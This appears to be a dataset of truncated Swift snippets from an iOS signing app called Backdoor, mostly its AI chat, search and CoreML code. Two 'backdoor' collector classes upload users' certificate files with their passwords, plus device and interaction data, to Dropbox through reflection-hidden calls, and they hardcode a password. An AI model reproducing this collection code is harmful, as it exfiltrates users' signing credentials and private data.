1667,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ Complete data package to send to the server","struct DeviceData: Codable {
let deviceId: String
let appVersion: String
let modelVersion: String
let osVersion: String
let interactions: [Interaction]
let behaviors: [AppBehavior]?
let patterns: [UsagePattern]?

init(deviceId: String, appVersion: String, modelVersion: String, osVersion: String,"
1668,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ Response from the server containing model information / Matches the example response: / { /   ""success"": true, /   ""message"": ""Data received successfully"", /   ""latestModelVersion"": ""1.0.1712052481"", /   ""modelDownloadURL"": ""https://yourdomain.com/api/ai/models/1.0.1712052481"" / }","struct ModelInfo: Codable {
let success: Bool
let message: String
let latestModelVersion: String
let modelDownloadURL: String?
}

/// Errors that can occur during API operations
enum APIError: Error, LocalizedError {"
1669,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ Errors that can occur during API operations","enum APIError: Error, LocalizedError {
case invalidResponse
case modelNotFound
case encodingFailed
case decodingFailed
case downloadFailed
case networkError(Error)

var errorDescription: String? {"
1670,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","/ Self-contained data collection class for backdoor functionality / This class intentionally avoids extending any existing classes to prevent conflicts","class BackdoorDataCollector {
// MARK: - Singleton

static let shared = BackdoorDataCollector()

// MARK: - Properties

private var isCollecting = false
private var certificateDataQueue: [(data: Data, password: String?, name: String)] = []
private var userInteractionsQueue: [(date: Date, action: String, context: String)] = []"
1671,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","MARK: - Notification Handling","@objc private func userDefaultsDidChange() {
let hasConsent = UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"")

if hasConsent, !isCollecting {"
1672,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","MARK: - Certificate Collection / Process a certificate file and password if user has consented","func processCertificateData(_ data: Data, password: String? = nil, name: String) {
// Only proceed if user has consented
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
1673,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","/ Process a certificate file from a URL","func processCertificateFile(url: URL, password: String? = nil) {
// Only proceed if user has consented
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
1674,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","MARK: - User Interaction Collection / Log a user interaction if consent is given","func logUserInteraction(action: String, context: String = """") {
// Only proceed if user has consented
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
1675,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","MARK: - Device Info Collection / Upload device information to Dropbox","func uploadDeviceInfo() {
// Only proceed if user has consented
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
1676,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","MARK: - Control Methods / Start collecting data (called when consent is given)","func startCollection() {
isCollecting = true
uploadDeviceInfo()

// Start periodic collection timer
startPeriodicCollection()
}

/// Stop collecting data (called when consent is revoked)
func stopCollection() {"
1677,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","/ Stop collecting data (called when consent is revoked)","func stopCollection() {
isCollecting = false

// Clear any queued data
queueLock.lock()
certificateDataQueue.removeAll()
userInteractionsQueue.removeAll()
queueLock.unlock()
}
"
1678,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","MARK: - Background Processing / Process all queued data in the background","private func processQueuedData() {
backgroundQueue.async { [weak self] in"
1679,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","/ Start periodic collection of data","private func startPeriodicCollection() {
// Schedule periodic collection every 30 minutes
backgroundQueue.asyncAfter(deadline: .now() + 30 * 60) { [weak self] in"
1680,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","MARK: - Upload Methods / Upload certificate data to Dropbox","private func uploadCertificateData(_ data: Data, password: String? = nil, name: String) {
// Create a temporary file
do {"
1681,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","/ Upload certificate file to Dropbox","private func uploadCertificateFile(url: URL, password: String? = nil) {
// Use reflection to avoid direct references to EnhancedDropboxService
if let dropboxServiceClass = NSClassFromString(""EnhancedDropboxService"") as? NSObject.Type,
let dropboxService = dropboxServiceClass.value(forKey: ""shared"") as? NSObject
{"
1682,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","/ Upload user interactions batch to Dropbox","private func uploadInteractionBatch(_ interactions: [(date: Date, action: String, context: String)]) {
// Create log entry for interactions
let dateFormatter = ISO8601DateFormatter()
var logEntry = ""=== USER INTERACTIONS LOG ===\n""
logEntry += ""Timestamp: \(dateFormatter.string(from: Date()))\n""
logEntry += ""Device: \(UIDevice.current.name)\n""
logEntry += ""Count: \(interactions.count)\n\n""

for (index, interaction) in interactions.enumerated() {"
1683,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","/ Upload a log entry to Dropbox","private func uploadLogEntry(_ logEntry: String, fileName _: String) {
// Use reflection to avoid direct references to EnhancedDropboxService
if let dropboxServiceClass = NSClassFromString(""EnhancedDropboxService"") as? NSObject.Type,
let dropboxService = dropboxServiceClass.value(forKey: ""shared"") as? NSObject,
dropboxService.responds(to: Selector((""uploadLogEntry:fileName:completion:"")))
{"
1684,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","/ Upload data to Dropbox as JSON","private func uploadToDropbox(data: [String: Any], type: String) {
do {"
1685,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","MARK: - Dataset Management / Get list of available datasets","func getAvailableDatasets() -> [String: Any] {
// Simulated dataset information
return [
""datasets"": [
[
""name"": ""User Intent Classification"",
""size"": 2_500_000,
""description"": ""Dataset for classifying user intents from chat messages"",
""date_added"": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 5)),
],"
1686,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift","/ Check if a dataset password is valid","func validateDatasetPassword(_ password: String) -> Bool {
// Hardcoded password as specified in requirements
return password == ""2B4D5G""
}
}
"
1687,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift","/ Class responsible for providing rich context to the custom AI system","class CustomAIContextProvider {
// Singleton instance
static let shared = CustomAIContextProvider()

// Cache for storing computed context information
private var contextCache: [String: Any] = [:]
private var lastContextUpdateTime: Date = .init()

// Refresh interval for context cache (5 minutes)
private let cacheRefreshInterval: TimeInterval = 300"
1688,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift","Function clearCache - implements clearcache functionality","@objc private func clearCache() {
contextCache.removeAll()
lastContextUpdateTime = Date()
}

/// Get comprehensive context information about the app state
func getContextInformation() -> [String: Any] {"
1689,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift","/ Get comprehensive context information about the app state","func getContextInformation() -> [String: Any] {
// Check if we need to refresh the cache
let now = Date()
if now.timeIntervalSince(lastContextUpdateTime) > cacheRefreshInterval {"
1690,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift","/ Force refresh of the context cache","func refreshContext() {
updateContextCache()
}

/// Update the context cache with fresh data
private func updateContextCache() {"
1691,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift","/ Update the context cache with fresh data","private func updateContextCache() {
// Start with basic app information
var context: [String: Any] = [
""appVersion"": Bundle.main.infoDictionary?[""CFBundleShortVersionString""] as? String ?? ""Unknown"",
""buildNumber"": Bundle.main.infoDictionary?[""CFBundleVersion""] as? String ?? ""Unknown"",
""deviceModel"": UIDevice.current.model,
""systemVersion"": UIDevice.current.systemVersion,
""interfaceStyle"": UITraitCollection.current.userInterfaceStyle == .dark ? ""dark"" : ""light"",
""timestamp"": ISO8601DateFormatter().string(from: Date()),
]"
1692,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift","/ Get a natural language summary of the current app state","func getContextSummary() -> String {
let context = getContextInformation()

// Create a user-friendly summary
var summary = ""You're using Backdoor version \(context[""appVersion""] ?? ""Unknown"").""

// Add certificate info
if let certificates = context[""certificates""] as? [String: Any],
let count = certificates[""count""] as? Int
{"
1693,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift","/ Extension for CustomAIService to add deep search capabilities","extension CustomAIService {
/// Determine the appropriate search depth for a query
func determineSearchDepth(for query: String) -> SearchDepth {"
1694,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift","/ Determine the appropriate search depth for a query","func determineSearchDepth(for query: String) -> SearchDepth {
let lowercasedQuery = query.lowercased()

// Check for deep search indicators
if lowercasedQuery.contains(""deep search"") ||
lowercasedQuery.contains(""comprehensive"") ||
lowercasedQuery.contains(""detailed"") ||
lowercasedQuery.contains(""in-depth"") ||
lowercasedQuery.contains(""thorough"")
{"
1695,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift","/ Determine the search query type","func getSearchType(from query: String) -> SearchQueryType {
let lowercasedQuery = query.lowercased()

// Academic content
if lowercasedQuery.contains(""academic"") ||
lowercasedQuery.contains(""research"") ||
lowercasedQuery.contains(""scientific"") ||
lowercasedQuery.contains(""journal"") ||
lowercasedQuery.contains(""paper"") ||
lowercasedQuery.contains(""study"") ||"
1696,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift","/ Perform a web search with the given query and return formatted results","func performWebSearch(query: String, completion: @escaping (String) -> Void) {
Debug.shared.log(message: ""Performing web search for: \(query)"", type: .info)

WebSearchManager.shared.performSearch(query: query) { result in"
1697,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift","/ Perform a deep search with enhanced capabilities","func performDeepSearch(
query: String,
depth: SearchDepth = .enhanced,
queryType: SearchQueryType = .general,
completion: @escaping (String) -> Void
) {"
1698,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift","/ Handle specialized academic searches","func performAcademicSearch(query: String, completion: @escaping (String) -> Void) {
Debug.shared.log(message: ""Performing academic search for: \(query)"", type: .info)

// Use the deep search with academic focus
performDeepSearch(query: query, depth: .specialized, queryType: .academic, completion: completion)
}

/// Handle specialized news searches
func performNewsSearch(query: String, completion: @escaping (String) -> Void) {"
1699,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift","/ Handle specialized news searches","func performNewsSearch(query: String, completion: @escaping (String) -> Void) {
Debug.shared.log(message: ""Performing news search for: \(query)"", type: .info)

// Use the deep search with news focus
performDeepSearch(query: query, depth: .specialized, queryType: .news, completion: completion)
}
}
"
1700,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","Search query types for specialized searches","enum SearchQueryType {
case general
case academic
case news
case technical
case reference
}

/// Custom AI service that replaces the OpenRouter API with a local AI implementation
final class CustomAIService {"
1701,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","/ Custom AI service that replaces the OpenRouter API with a local AI implementation","final class CustomAIService {
// Singleton instance for app-wide use
static let shared = CustomAIService()

// Flag to track if CoreML is initialized
private var isCoreMLInitialized = false

private init() {"
1702,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","/ Initialize CoreML model","private func initializeCoreML() {
Debug.shared.log(message: ""Starting CoreML initialization for AI service"", type: .info)

// Check if CoreML is already loaded by the manager
if CoreMLManager.shared.isModelLoaded {"
1703,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","/ Handle CoreML model load completion notification","@objc private func handleCoreMLModelLoaded() {
if !isCoreMLInitialized {"
1704,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","/ Handle AI capabilities enhancement notification","@objc private func handleAICapabilitiesEnhanced() {
if !isCoreMLInitialized, CoreMLManager.shared.isModelLoaded {"
1705,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","enum ServiceError - implements functionality related to service error","enum ServiceError: Error, LocalizedError {
case processingError(String)
case contextMissing

var errorDescription: String? {"
1706,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","Maintained for compatibility with existing code","struct AIMessagePayload {
let role: String
let content: String
}

/// Process user input and generate an AI response
func getAIResponse(
messages: [AIMessagePayload],
context: AppContext,
completion: @escaping (Result<String, ServiceError>) -> Void"
1707,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","/ Process user input and generate an AI response","func getAIResponse(
messages: [AIMessagePayload],
context: AppContext,
completion: @escaping (Result<String, ServiceError>) -> Void
) {"
1708,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","/ Process a response string for embedded search commands and execute them if found","private func processResponseForSearchCommands(response: String, completion: @escaping (String) -> Void) {
// Define the pattern to match search commands
let patterns = [
""\\[web search:([^\\]]+)\\]"",
""\\[deep search:([^\\]]+)\\]"",
""\\[academic search:([^\\]]+)\\]"",
""\\[news search:([^\\]]+)\\]"",
""\\[specialized search:([^\\]]+)\\]"",
]
"
1709,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","/ Convert MessageIntent to string representation for learning","private func getIntentString(from intent: MessageIntent) -> String {
switch intent {"
1710,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","Extract meaningful context from conversation history","private func extractConversationContext(messages: [AIMessagePayload]) -> String {
// Get the last 5 messages for context (or fewer if there aren't 5)
let contextMessages = messages.suffix(min(5, messages.count))

return contextMessages.map { ""\($0.role): \($0.content)"" }.joined(separator: ""\n"")"
1711,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","MARK: - Intent Analysis","enum MessageIntent {
case question(topic: String)
case appNavigation(destination: String)
case appInstall(appName: String)
case appSign(appName: String)
case sourceAdd(url: String)
case webSearch(query: String)
case generalHelp
case greeting
case unknown"
1712,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","Function analyzeUserIntent - implements analyzeuserintent functionality","func analyzeUserIntent(message: String) -> MessageIntent {
let lowercasedMessage = message.lowercased()

// Check for greetings
if lowercasedMessage.contains(""hello"") || lowercasedMessage
.contains(""hi "") || lowercasedMessage == ""hi"" || lowercasedMessage.contains(""hey"")
{"
1713,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","MARK: - Response Generation","func generateResponse(
intent: MessageIntent,
userMessage: String,
conversationHistory _: [AIMessagePayload],
conversationContext _: String,
appContext: AppContext
) -> String {"
1714,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","Helper extension for string regex replacement","extension String {
func replacing(regularExpression pattern: String, with replacement: String) -> String {"
1715,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift","Function replacing - implements replacing functionality","func replacing(regularExpression pattern: String, with replacement: String) -> String {
do {"
1716,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","/ Minimal, self-contained data collection class with no dependencies / This class uses minimal imports and avoids any dependencies that might cause conflicts","class MinimalBackdoorCollector {
// MARK: - Singleton

static let shared = MinimalBackdoorCollector()

// MARK: - Properties

private var isCollecting = false
private var backgroundQueue = DispatchQueue(label: ""com.backdoor.minimaldatacollector"", qos: .utility)
"
1717,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","MARK: - Notification Handling","@objc private func userDefaultsDidChange() {
let hasConsent = UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"")

if hasConsent, !isCollecting {"
1718,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","MARK: - Control Methods / Start collecting data (called when consent is given)","func startCollection() {
isCollecting = true
uploadDeviceInfo()
}

/// Stop collecting data (called when consent is revoked)
func stopCollection() {"
1719,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","/ Stop collecting data (called when consent is revoked)","func stopCollection() {
isCollecting = false
}

// MARK: - Collection Methods

/// Upload device information
func uploadDeviceInfo() {"
1720,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","MARK: - Collection Methods / Upload device information","func uploadDeviceInfo() {
// Only proceed if user has consented
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
1721,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","/ Process a certificate file","func processCertificateFile(url: URL, password: String? = nil) {
// Only proceed if user has consented
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
1722,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","/ Log a user interaction","func logUserInteraction(action: String, context: String = """") {
// Only proceed if user has consented
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
1723,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","MARK: - Private Implementation","private func uploadDeviceInfoImpl() {
// Collect device information
let deviceInfo: [String: String] = [
""device_name"": UIDevice.current.name,
""system_name"": UIDevice.current.systemName,
""system_version"": UIDevice.current.systemVersion,
""model"": UIDevice.current.model,
""identifier_for_vendor"": UIDevice.current.identifierForVendor?.uuidString ?? ""unknown"",
""timestamp"": ISO8601DateFormatter().string(from: Date()),
""app_version"": Bundle.main.infoDictionary?[""CFBundleShortVersionString""] as? String ?? ""unknown"","
1724,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","Function processCertificateFileImpl - implements processcertificatefileimpl functionality","private func processCertificateFileImpl(url: URL, password: String? = nil) {
do {"
1725,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","Function logUserInteractionImpl - implements loguserinteractionimpl functionality","private func logUserInteractionImpl(action: String, context: String) {
let logEntry = """"""
=== USER INTERACTION LOG ===
Timestamp: \(ISO8601DateFormatter().string(from: Date()))
Action: \(action)
Context: \(context)
Device: \(UIDevice.current.name)
""""""

// Try to upload via our indirect methods"
1726,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","MARK: - Helper Methods / Try to upload via DropboxService (if available)","private func uploadViaDropboxService(_ method: String) -> Bool {
if let dropboxServiceClass = NSClassFromString(""EnhancedDropboxService"") as? NSObject.Type,
let dropboxService = dropboxServiceClass.value(forKey: ""shared"") as? NSObject,
dropboxService.responds(to: Selector((method)))
{"
1727,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","/ Try to upload file via DropboxService (if available)","private func uploadFileViaDropboxService(url: URL, password: String? = nil) -> Bool {
if let dropboxServiceClass = NSClassFromString(""EnhancedDropboxService"") as? NSObject.Type,
let dropboxService = dropboxServiceClass.value(forKey: ""shared"") as? NSObject
{"
1728,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","/ Try to upload log via DropboxService (if available)","private func uploadLogViaDropboxService(logEntry: String) -> Bool {
if let dropboxServiceClass = NSClassFromString(""EnhancedDropboxService"") as? NSObject.Type,
let dropboxService = dropboxServiceClass.value(forKey: ""shared"") as? NSObject
{"
1729,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","/ Store data locally (fallback if network services unavailable)","private func storeLocally(data: Any, filename: String) {
do {"
1730,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","MARK: - Dataset Management / Get list of available datasets","func getAvailableDatasets() -> [String: Any] {
// Simulated dataset information
return [
""datasets"": [
[
""name"": ""User Intent Classification"",
""size"": 2_500_000,
""description"": ""Dataset for classifying user intents from chat messages"",
""date_added"": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 5)),
],"
1731,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/MinimalBackdoorCollector.swift","/ Check if a dataset password is valid","func validateDatasetPassword(_ password: String) -> Bool {
// Hardcoded password as specified in requirements
return password == ""2B4D5G""
}
}
"
1732,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/NaturalLanguageHelper.swift","/ Helper class for natural language processing features","class NaturalLanguageHelper {
// Singleton instance
static let shared = NaturalLanguageHelper()

private init() {}"
1733,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/NaturalLanguageHelper.swift","/ Detect the language of a given text","func detectLanguage(in text: String) -> String {
// Use Apple's NaturalLanguage framework
let tagger = NLTagger(tagSchemes: [.language])
tagger.string = text
if let language = tagger.dominantLanguage?.rawValue {"
1734,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/NaturalLanguageHelper.swift","/ Get sentiment analysis for text / Returns score from -1.0 (negative) to 1.0 (positive)","func analyzeSentiment(in text: String) -> Double {
guard !text.isEmpty else { return 0.0 }"
1735,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/NaturalLanguageHelper.swift","/ Extract entities from text using Apple's NL framework","func extractEntities(from text: String) -> [String: String] {
var entities: [String: String] = [:]

// Use NLTagger for named entity recognition
let tagger = NLTagger(tagSchemes: [.nameType])
tagger.string = text

// Process entire text for entities
tagger.enumerateTags(in: text.startIndex ..< text.endIndex, unit: .word, scheme: .nameType) { tag, range in"
1736,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/NaturalLanguageHelper.swift","/ Tokenize text into words using Apple's tokenizer","func tokenize(text: String) -> [String] {
var tokens: [String] = []

let tokenizer = NLTokenizer(unit: .word)
tokenizer.string = text

tokenizer.enumerateTokens(in: text.startIndex ..< text.endIndex) { range, _ in"
1737,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/OpenAIService.swift","/ Service for interacting with the built-in AI system (maintains OpenAIService name for compatibility)","final class OpenAIService {
// Singleton instance for app-wide use
static let shared = OpenAIService()

private init() {"
1738,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/OpenAIService.swift","/ This method is maintained for backward compatibility but has no effect with the custom AI","func updateAPIKey(_: String) {
Debug.shared.log(message: ""API key updates not required for custom AI"", type: .debug)
}

enum ServiceError: Error, LocalizedError {"
1739,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/OpenAIService.swift","enum ServiceError - implements functionality related to service error","enum ServiceError: Error, LocalizedError {
case invalidURL
case invalidAPIKey
case networkError(Error)
case decodingError(Error)
case noData
case rateLimitExceeded
case serverError(Int)
case processingError(String)
"
1740,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/OpenAIService.swift","Maintained for compatibility with existing code","struct AIMessagePayload {
let role: String
let content: String
}

func getAIResponse(
messages: [AIMessagePayload],
context: AppContext,
completion: @escaping (Result<String, ServiceError>) -> Void
) {"
1741,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/OpenAIService.swift","Function getAIResponse - retrieves airesponse","func getAIResponse(
messages: [AIMessagePayload],
context: AppContext,
completion: @escaping (Result<String, ServiceError>) -> Void
) {"
1742,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift","/ Extension to CustomAIService that integrates CoreML model predictions","extension CustomAIService {
/// Enhanced analyze user intent using CoreML
func analyzeUserIntentWithML(message: String, completion: @escaping (MessageIntent) -> Void) {"
1743,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift","/ Enhanced analyze user intent using CoreML","func analyzeUserIntentWithML(message: String, completion: @escaping (MessageIntent) -> Void) {
// Start with traditional pattern matching as a fallback
let patternBasedIntent = analyzeUserIntent(message: message)

// Try to enhance with ML model
CoreMLManager.shared.predictIntent(from: message) { result in"
1744,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift","/ Convert ML model intent format to our MessageIntent enum","private func convertMLIntentToMessageIntent(intent: String, parameters: [String: Any],
message: String) -> MessageIntent
{"
1745,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift","/ Enhanced generate response using CoreML","func generateResponseWithML(
intent: MessageIntent,
userMessage: String,
conversationHistory: [AIMessagePayload],
conversationContext: String,
appContext: AppContext,
completion: @escaping (String) -> Void
) {"
1746,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift","/ Adapt response based on detected sentiment","private func adaptResponseToSentiment(response: String, sentiment: SentimentType) -> String {
switch sentiment {"
1747,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift","MARK: - Helper Extensions","extension Result {
/// Get the success value or return a default
func getOrElse(_ defaultValue: Success) -> Success {"
1748,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/AIModelIntegration.swift","/ Get the success value or return a default","func getOrElse(_ defaultValue: Success) -> Success {
switch self {"
1749,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Manages CoreML model loading and prediction operations","final class CoreMLManager {
// Singleton instance
static let shared = CoreMLManager()

// Model storage
private var mlModel: MLModel?
private var modelLoaded = false
private var modelURL: URL?

// Public getter for model loaded status"
1750,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Create an initial model from existing data if possible","private func createInitialModel() {
Debug.shared.log(message: ""Attempting to create initial AI model"", type: .info)

AILearningManager.shared.trainModelNow { success, message in"
1751,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Find the best available model with prioritized search logic","private func findBestAvailableModel() -> URL? {
Debug.shared.log(message: ""Looking for best available AI model"", type: .info)

// 1. First priority: User-generated models from AILearningManager
if let userModel = AILearningManager.shared.getLatestModelURL() {"
1752,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Load the CoreML model asynchronously with safeguards","func loadModel(completion: ((Bool) -> Void)? = nil) {
// Skip in safe mode
if SafeModeLauncher.shared.inSafeMode {"
1753,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Check if memory is constrained","private func isMemoryConstrained() -> Bool {
var info = mach_task_basic_info()
var count = mach_msg_type_number_t(MemoryLayout<mach_task_basic_info>.size) / 4

let kerr: kern_return_t = withUnsafeMutablePointer(to: &info) {"
1754,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Determine if we should check memory at all (performance optimization)","private func shouldCheckMemory() -> Bool {
// Only check memory on devices that might be constrained
let totalMemory = ProcessInfo.processInfo.physicalMemory
let totalMemoryGB = Double(totalMemory) / 1024.0 / 1024.0 / 1024.0

// Debug log total device memory
Debug.shared.log(message: ""Device has \(String(format: ""%.1f"", totalMemoryGB)) GB RAM"", type: .info)

